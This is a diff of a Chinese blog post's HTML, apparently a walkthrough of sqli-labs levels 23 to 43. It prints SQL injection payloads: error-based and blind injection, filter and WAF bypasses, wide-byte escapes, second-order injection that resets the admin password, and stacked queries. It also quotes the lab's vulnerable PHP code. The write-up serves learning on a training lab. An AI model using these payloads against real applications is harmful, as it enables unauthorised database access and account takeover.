 <p>构造payload：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(1,(select database()))) or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>或者用<span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;闭合后面的引号也行</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()))) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=1&#x27; and extractvalue(1,concat(1,(select database()))) or &#x27;1&#x27;=&#x27;1<br>或者用and &#x27;闭合后面的引号也行<br>id=1&#x27; and extractvalue(1,concat(1,(select database()))) and &#x27;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230717154544881.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717154544881.png"></p>
 <p>这里是报错注入所以就不用太在意and、or逻辑关系</p>
 <p>(前面报错注入做太爽了后面才注意到可以直接联合注入，无所谓，报错注入真好用)</p>
 <h4 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h4><p>目前最牛的一级</p>
@@ -725,54 +336,54 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#login.php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqllogin</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>   <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br>   <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<br>   <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br>   <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);<br>   <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_row</span>(<span class="hljs-variable">$res</span>);<br>	<span class="hljs-comment">//print_r($row) ;</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]) &#123;<br>			<span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br><br>&#125;<br><br><span class="hljs-variable">$login</span> = <span class="hljs-title function_ invoke__">sqllogin</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$login</span>== <span class="hljs-number">0</span>) <br>&#123;<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>] = <span class="hljs-variable">$login</span>;<br>	<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;Auth&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);  <span class="hljs-comment">/* expire in 15 Minutes */</span><br>	<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: logged-in.php&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure>
 
 <p>从login.php这里的代码就能看出SESSION的值取决于变量$login的值，变量$login的值取决于用户在登录时的用户名(row的第一个字段)，那就慢慢变得有点头绪了，只要创建一个新用户，控制新用户用户名就能间接控制SESSION。进而达到控制数据库的目的。</p>
-<p>逻辑理到这里了突然就卡壳了，受限于之前的惯性思维一直以为是要获取数据库中的数据，想了很久没想出个所以然来，去看了眼题解，发现这种注入被称为二次注入，当以<code>admin&#39;#</code>的身份登录后修改其密码，实际上就能修改admin的密码<img src="/2023/02/09/SQLI/66.png" srcset="/img/loading.gif" lazyload></p>
+<p>逻辑理到这里了突然就卡壳了，受限于之前的惯性思维一直以为是要获取数据库中的数据，想了很久没想出个所以然来，去看了眼题解，发现这种注入被称为二次注入，当以<code>admin&#39;#</code>的身份登录后修改其密码，实际上就能修改admin的密码<img src="/2023/02/09/SQLI/66.png"></p>
 <p>SQL语句如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#    &#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>结果是打完之后忘记<code>admin&#39;#</code>的密码了。。。等我晚上重启一下数据库。。</p>
-<p>军训归来（，新建一个新用户<code>admin&#39;#</code><img src="/2023/02/09/SQLI/image-20230717215358223.png" srcset="/img/loading.gif" lazyload></p>
-<p>用<code>admin&#39;#</code>登录<img src="/2023/02/09/SQLI/image-20230717215500916.png" srcset="/img/loading.gif" lazyload></p>
-<p>修改其密码为114514，根据sql语句分析，此时应该修改了<code>admin</code>用户的密码<img src="/2023/02/09/SQLI/image-20230717215554491.png" srcset="/img/loading.gif" lazyload></p>
+<p>军训归来（，新建一个新用户<code>admin&#39;#</code><img src="/2023/02/09/SQLI/image-20230717215358223.png"></p>
+<p>用<code>admin&#39;#</code>登录<img src="/2023/02/09/SQLI/image-20230717215500916.png"></p>
+<p>修改其密码为114514，根据sql语句分析，此时应该修改了<code>admin</code>用户的密码<img src="/2023/02/09/SQLI/image-20230717215554491.png"></p>
 <p>成功登录admin</p>
-<p><img src="/2023/02/09/SQLI/image-20230717215729390.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717215729390.png"></p>
 <h4 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h4><p>一个简单的双写过滤，payload：</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; anandd extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; anandd extractvalue(1,concat(1,(select database())))--+<br></code></pre></td></tr></table></figure>
 
 <h4 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h4><p>空格过滤，or and过滤，注释符过滤</p>
 <p>注释符过滤前面提到可以通过闭合后引号解决，空格过滤在此之前只接触过&#x2F;**&#x2F;，才疏学浅，结果发现&#x2F;**&#x2F;也被过滤了（呜呜呜呜</p>
 <p>去找了找网上的资料，如果空格被过滤了可以用如下字符替代：</p>
-<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span>：非断行空格<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span>：新建一行<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span>：Tab(垂直)<br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span>：新的一页<br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span>：return<br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span>：Tab(水平)<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%a0：非断行空格<br>%0a：新建一行<br>%0b：Tab(垂直)<br>%0c：新的一页<br>%0d：return<br>%09：Tab(水平)<br></code></pre></td></tr></table></figure>
 
 <p>这里%a0和%0b可行，payload：</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%a0anandd</span><span class="hljs-variable">%a0extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%a0database</span>())))<span class="hljs-variable">%a0oorr</span>&#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-operator">=</span>&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;%a0anandd%a0extractvalue(1,concat(1,(select%a0database())))%a0oorr&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>
 
 <p>在网上看到一种神奇的写法，记个笔记：</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">1&#x27;</span>||(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>))||<span class="hljs-string">&#x27;0 </span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),1))||&#x27;0 <br></code></pre></td></tr></table></figure>
 
 <h4 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h4><p>payload：</p>
 <p>依旧对空格过滤，但是这回上面提到的几个都行，select存在过滤，selEct大写绕过</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>aupdatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(selEct<span class="hljs-variable">%0</span>adatabase())))<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>a&#x27;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;%0aand%0aupdatexml(1,(concat(1,(selEct%0adatabase()))),1)%0aand%0a&#x27;<br></code></pre></td></tr></table></figure>
 
 <h4 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h4><p>没有报错信息，报错注入行不通了，试下盲注，空格依旧使用%0a过滤，payload：</p>
-<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-meta">%27</span><span class="hljs-meta">%0aand</span><span class="hljs-meta">%0alength</span>(database())=<span class="hljs-number">8</span><span class="hljs-meta">%0aor</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%271</span><span class="hljs-meta">%27</span>=<span class="hljs-meta">%272</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1%27%0aand%0alength(database())=8%0aor%0a%271%27=%272<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230718004643507.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230718004823424.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230718004643507.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230718004823424.png"></p>
 <p>这里就要注意or和and之间的逻辑关系了，上面两种是正确的注入逻辑，下面两种是错误的注入逻辑</p>
-<p><img src="/2023/02/09/SQLI/image-20230718004737058.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230718005009949.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230718004737058.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230718005009949.png"></p>
 <p>时间盲注也行，但是可以用布尔盲注为什么要用时间盲注呢（笑</p>
 <h4 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h4><p>测试单引号出现报错加注释报错消失，也没有任何的过滤。。</p>
 <p>payload：</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span><span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>database())))--+<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1%27%20and%20extractvalue(1,concat(1,(select%20database())))--+<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230718083706449.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230718083706449.png"></p>
 <p>Protected By The World’s Best Firewall。。。emmm</p>
 <p>感觉没那么简单，看了眼源代码，咋还有个login.php和hacked.php，找遍网页也没出现这俩，手动进login.php，看起来像是隐藏关卡？</p>
-<p><img src="/2023/02/09/SQLI/image-20230718084006936.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230718084006936.png"></p>
 <p>还多了两个pdf链接，应该是提示之类的，先不看，直接刚一下</p>
 <p>测试了下单引号双引号闭合，都炸了，如下</p>
-<p><img src="/2023/02/09/SQLI/image-20230718084437619.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230718084437619.png"></p>
 <p>啊？试了很久发现除了最中规中矩的纯数字，其他通通都会寄。。有点意思，那就看下源代码</p>
 <p>有个白名单，如果传入不是纯数字就跳转到hacked.php，emmm…不急往下看</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-variable">$match</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);<br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$match</span>)<br>	&#123;<br>		<span class="hljs-comment">//echo &quot;you are good&quot;;</span><br>		<span class="hljs-comment">//return $match;</span><br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;	<br>		<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);<br>		<span class="hljs-comment">//echo &quot;you are bad&quot;;</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -784,17 +395,17 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-variable">$hint</span>=<span class="hljs-variable">$qs</span>;<br><span class="hljs-variable">$id1</span>=<span class="hljs-title function_ invoke__">java_implimentation</span>(<span class="hljs-variable">$qs</span>);<br><span class="hljs-comment">//echo $id1;</span><br><span class="hljs-title function_ invoke__">whitelist</span>(<span class="hljs-variable">$id1</span>);<br></code></pre></td></tr></table></figure>
 
 <p>最后那个pdf的内容提炼出来就是这样一张表：</p>
-<p><img src="/2023/02/09/SQLI/image-20230719171718086.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230719171718086.png"></p>
 <p>可以看到搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，所以<code>$_GET[&#39;id&#39;]</code>变量实际上是最后一个id参数，但是根据waf的意思，实际上过滤的是最先出现的参数id，对第二个id参数进行注入就行了</p>
-<p><img src="/2023/02/09/SQLI/image-20230719180637741.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230719180637741.png"></p>
 <h3 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h3><p>表关卡没啥好说的，双引号闭合联合注入：</p>
-<p><img src="/2023/02/09/SQLI/image-20230814174550933.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230814174550933.png"></p>
 <p>主要看里关：</p>
 <p>同29关，HPP参数污染，把单引号换成双引号</p>
 <h3 id="level31"><a href="#level31" class="headerlink" title="level31"></a>level31</h3><p>表关：</p>
-<p><img src="/2023/02/09/SQLI/image-20230814182840820.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230814182840820.png"></p>
 <p>里关：</p>
-<p><img src="/2023/02/09/SQLI/image-20230814182932470.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230814182932470.png"></p>
 <h3 id="level32"><a href="#level32" class="headerlink" title="level32"></a>level32</h3><p>直接就是把引号给转义了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">preg_quote</span>(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          <span class="hljs-comment">//escape any backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);                               <span class="hljs-comment">//escape single quote with a backslash</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                <span class="hljs-comment">//escape double quote with a backslash</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -802,61 +413,61 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>宽字节的格式就是在地址后面加一个%df，再加单引号，可以通过上面的测试发现，在单引号之前PHP会自动加一个\（反斜杠），因为反斜杠的编码为%5c，所以自动转义为&#39;，而在GBK编码中，%df5c是繁体字“連”，由于汉字是双字节，所以这里’之前的\就会被吃掉消失，那么会造成单引号成功逃逸，爆出MySQL数据库的错误。</p>
-<p><img src="/2023/02/09/SQLI/image-20230814185222764.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230814185222764.png"></p>
 <h3 id="level33"><a href="#level33" class="headerlink" title="level33"></a>level33</h3><p>同32</p>
 <h3 id="level34"><a href="#level34" class="headerlink" title="level34"></a>level34</h3><p>在POST里进行宽字节注入</p>
-<p><img src="/2023/02/09/SQLI/image-20230814223619447.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230814223619447.png"></p>
 <h3 id="level35"><a href="#level35" class="headerlink" title="level35"></a>level35</h3><p>虽然使用addslashes()进行了转义，但是id变量并没有用引号闭合，</p>
-<p><img src="/2023/02/09/SQLI/image-20230814223857407.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230814223857407.png"></p>
 <p>主要影响到爆字段名等之后需要引号的部分：</p>
-<p><img src="/2023/02/09/SQLI/image-20230815003116109.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815003116109.png"></p>
 <p>再加上0x</p>
-<p><img src="/2023/02/09/SQLI/image-20230815003059843.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815003059843.png"></p>
 <h3 id="level36"><a href="#level36" class="headerlink" title="level36"></a>level36</h3><p>使用<code>mysql_real_escape_string()</code>函数来转义特殊字符，包括单双引号</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$string</span>);    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230815004545376.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="level37"><a href="#level37" class="headerlink" title="level37"></a>level37</h3><p><img src="/2023/02/09/SQLI/image-20230815005104471.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815004545376.png"></p>
+<h3 id="level37"><a href="#level37" class="headerlink" title="level37"></a>level37</h3><p><img src="/2023/02/09/SQLI/image-20230815005104471.png"></p>
 <h3 id="level38"><a href="#level38" class="headerlink" title="level38"></a>level38</h3><p>正常单引号闭合注入ok，感觉没那么容易去看了眼源代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure>
 
 <p>是存在<code>mysqli_multi_query()</code>，可执行多条sql语句，因此也可以进行堆叠注入</p>
-<p>插入新用户potato<img src="/2023/02/09/SQLI/image-20230815011429361.png" srcset="/img/loading.gif" lazyload></p>
+<p>插入新用户potato<img src="/2023/02/09/SQLI/image-20230815011429361.png"></p>
 <p>查询id为999的用户：</p>
-<p><img src="/2023/02/09/SQLI/image-20230815011528753.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815011528753.png"></p>
 <h3 id="level39"><a href="#level39" class="headerlink" title="level39"></a>level39</h3><p>id无闭合，数字型，直接注入即可，也可像上题一样堆叠注入</p>
 <h3 id="level40"><a href="#level40" class="headerlink" title="level40"></a>level40</h3><p>单引号+括号闭合，</p>
-<p><img src="/2023/02/09/SQLI/image-20230815012201662.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815012201662.png"></p>
 <p>源代码里混入了level24的二次注入？</p>
 <h3 id="level41"><a href="#level41" class="headerlink" title="level41"></a>level41</h3><p>数字型，但是可以堆叠注入</p>
-<p><img src="/2023/02/09/SQLI/image-20230815012626998.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="level42"><a href="#level42" class="headerlink" title="level42"></a>level42</h3><p><img src="/2023/02/09/SQLI/image-20230815021217636.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815012626998.png"></p>
+<h3 id="level42"><a href="#level42" class="headerlink" title="level42"></a>level42</h3><p><img src="/2023/02/09/SQLI/image-20230815021217636.png"></p>
 <p>点开忘记密码：</p>
-<p><img src="/2023/02/09/SQLI/image-20230815021236797.png" srcset="/img/loading.gif" lazyload></p>
-<p>点开新用户：<img src="/2023/02/09/SQLI/image-20230815021258728.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815021236797.png"></p>
+<p>点开新用户：<img src="/2023/02/09/SQLI/image-20230815021258728.png"></p>
 <p>emmm，结合源代码，堆叠注入没跑了：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure>
 
 <p>注意username被转义，可以利用password</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230815022717060.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815022717060.png"></p>
 <p>登陆成功</p>
-<p><img src="/2023/02/09/SQLI/image-20230815022744676.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815022744676.png"></p>
 <h3 id="level43"><a href="#level43" class="headerlink" title="level43"></a>level43</h3><p>同上题，只是闭合方式换成了单引号括号：</p>
